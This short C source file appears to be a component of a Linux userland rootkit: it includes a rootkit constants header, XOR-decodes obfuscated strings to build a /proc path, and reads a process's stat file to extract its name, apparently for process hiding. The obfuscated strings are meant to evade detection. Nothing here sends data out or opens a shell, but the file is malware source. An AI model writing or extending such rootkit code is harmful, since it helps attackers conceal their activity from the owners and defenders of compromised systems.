#include <string.h> 
#include <stdio.h> 
#include "../rkconst.h"

int name_from_pid(char *pid, char *buf)
{ 
	if (strspn(pid, "0123456789") != strlen(pid)) return 0; 
	char tmp[256]; 
	char *proc = strdup(PROC); xor(proc);
	char *str1 = strdup(NFP_STR_STAT); xor(str1); 
	char *str2 = strdup(NFP_STR_RGX); xor(str2);	
	
	/* find dir of pid in proc */
	snprintf(tmp, sizeof(tmp), str1, proc, pid); 
	FILE* f = fopen(tmp, "r"); 
	if (f==NULL) return 0; 
	if (fgets(tmp, sizeof(tmp), f) == NULL)
	{ 
		CLEAN(str1); 
		CLEAN(str2);
		CLEAN(proc);
		fclose(f); 
		return 0; 
	}
	fclose(f);
	int i; 
	/* find (name) in stat and put in buf) */
	sscanf(tmp, str2, &i, buf); 
	CLEAN(str1); 
	CLEAN(str2);
	CLEAN(proc);
	return 1;
}

